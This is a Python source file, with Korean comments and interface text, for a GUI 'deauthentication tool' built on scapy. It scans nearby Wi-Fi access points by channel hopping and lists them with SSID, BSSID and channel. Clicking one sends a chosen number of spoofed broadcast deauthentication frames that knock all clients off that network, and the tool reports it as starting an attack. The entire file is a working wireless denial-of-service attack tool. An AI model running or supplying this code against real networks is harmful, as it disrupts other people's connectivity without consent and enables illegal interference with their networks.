from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt
from tkinter import *
import tkinter.messagebox as msgbox
import subprocess
import threading
import time


class Hacker:
    def __init__(self):
        self.iface=None
        self.ap_list = []
        self.scanning=False

    def ap_scan(self):
        self.scanning=True
        print("주변 AP 스캔 중... ")
        sniff(iface=self.iface, prn=self.packet_handler,stop_filter=lambda pkt : not self.scanning)
        print("\n스캔 종료")
        self.scanning=False

    def packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            bssid = pkt[Dot11].addr3
            channel = None
            elt = pkt[Dot11Elt]

            while isinstance(elt, Dot11Elt):
                # DS Parameter Set (2.4GHz 일반 채널 정보)
                if elt.ID == 3:
                    channel = elt.info[0]
                # HT Operation (5GHz 또는 HT 채널 정보)
                elif elt.ID == 61 and len(elt.info) >= 1:
                    ht_channel = elt.info[0]
                    if not channel:  # HT가 있으면 우선순위
                        channel = ht_channel
                # VHT Operation (Very High Throughput, 802.11ac)
                elif elt.ID == 192 and len(elt.info) >= 2:
                    vht_channel = elt.info[1] + 36  # 대략적인 계산 방식 (추정)
                    if not channel:
                        channel = vht_channel
                elt = elt.payload.getlayer(Dot11Elt)


            if (ssid, bssid, channel) not in self.ap_list:
                self.ap_list.append((ssid, bssid, channel))
                print(f"SSID: {ssid}, BSSID: {bssid}, CHANNEL: {channel}")

    def is_monitor_mode(self):
        try:
            result = subprocess.check_output(["iwconfig", self.iface]).decode()
            return "Mode:Monitor" in result
        except subprocess.CalledProcessError:
            return False
        
    def deauth(self, ap, ch, ct):
        target = "ff:ff:ff:ff:ff:ff"
        dot11=Dot11(addr1=target, addr2=ap, addr3=ap)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)


        subprocess.run(
            ["sudo", "iwconfig", self.iface, "channel", str(ch)],
            check=True
        )

        sendp(packet, iface=self.iface, count=ct, inter=0.005, verbose=1)

    def channel_hopping(self, channels, interval=0.5):
        while self.scanning:
            for ch in channels:
                subprocess.run(["sudo", "iwconfig", self.iface, "channel", str(ch)])
                time.sleep(interval)



class MainWindow(Tk,Hacker):
    def __init__(self):
        super().__init__()
        Hacker.__init__(self)

        self.geometry('600x400')
        self.title("deauthentication tool")

        self.bind("<Key>", self.handle_key)
        sub_loop=threading.Thread(target=self.sub_loop_start)
        sub_loop.daemon=True
        sub_loop.start()

        self.set_gui()


    def set_gui(self):

        self.entry_iface=Entry(self)
        self.entry_iface.grid(row=0, column=0,columnspan=2)

        self.entry_count=Entry(self)
        self.entry_count.grid(row=0, column=3,columnspan=1)

        
        self.btn_scan = Button(self, text="AP 스캔",command=self.AP_scan_btn)
        self.btn_scan.grid(row=1,column=0,columnspan=2)
        self.btn_scan_quit=Button(self, text="스캔 종료", command=self.stop_scan)

        Label(self, text="AP 리스트").grid(row=2,column=0,columnspan=2)
        Label(self, text="SSID").grid(row=3,column=0)
        Label(self, text="BSSID").grid(row=3,column=1)

        self.frame_ap_list=Frame(self)
        self.frame_ap_list.grid(row=4, column=0, columnspan=2)


    def handle_key(self, event):
        self.iface=self.entry_iface.get()

    def sub_loop_start(self):
        packed_btn=0
        while True:
            if len(self.ap_list)>packed_btn:
                new_AP=self.ap_list[packed_btn-len(self.ap_list)]
                print(packed_btn)
                Button(self.frame_ap_list, text=new_AP[0], command=lambda i=packed_btn: self.deauth_start(i)).grid(row=packed_btn, column=0)
                Label(self.frame_ap_list, text=new_AP[1]).grid(row=packed_btn, column=1)
                packed_btn+=1
            time.sleep(1)

    def AP_scan_btn(self):
        if not self.iface:
            msgbox.showerror("경고","인터페이스를 입력해주세요")
            return
        if not self.is_monitor_mode():
            msgbox.showerror("경고","인터페이스가 모니터 모드가 아닙니다.")
            return
        thread = threading.Thread(target=self.ap_scan)
        thread.start()



        channels_24ghz = list(range(1, 14 + 1))  # 1~13 (한국 기준)

        # 5GHz 채널 – DFS 제외 (일반 공유기 + 공격용 랜카드에서 자주 사용됨)
        channels_5ghz_non_dfs = [36, 40, 44, 48, 149, 153, 157, 161, 165]

        # 5GHz 채널 – DFS 포함 (일부 랜카드는 제약, 레이더 간섭 감지 필요)
        channels_5ghz_dfs = [52, 56, 60, 64,
                            100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140]

        # 전체 결합
        channels = channels_24ghz + channels_5ghz_non_dfs + channels_5ghz_dfs

        thread_channel_hopping = threading.Thread(target=self.channel_hopping, args=([channels]))
        thread_channel_hopping.start()

        self.btn_scan.destroy()
        self.btn_scan_quit.grid(row=1,column=0, columnspan=2)
        msgbox.showinfo("","주변 AP 스캔 시작")


    def stop_scan(self):
        self.scanning=False
        self.btn_scan_quit.destroy()

    def deauth_start(self,index):
        ssid=self.ap_list[index][0]
        ap=self.ap_list[index][1]
        ch=self.ap_list[index][2]
        ct=int(self.entry_count.get())

        print(ch)

        thread=threading.Thread(target=self.deauth, args=(ap,ch,ct))
        thread.start()
        msgbox.showinfo("",f"{ssid}에게 공격 시작")



if __name__=="__main__":
    app = MainWindow()
    app.mainloop()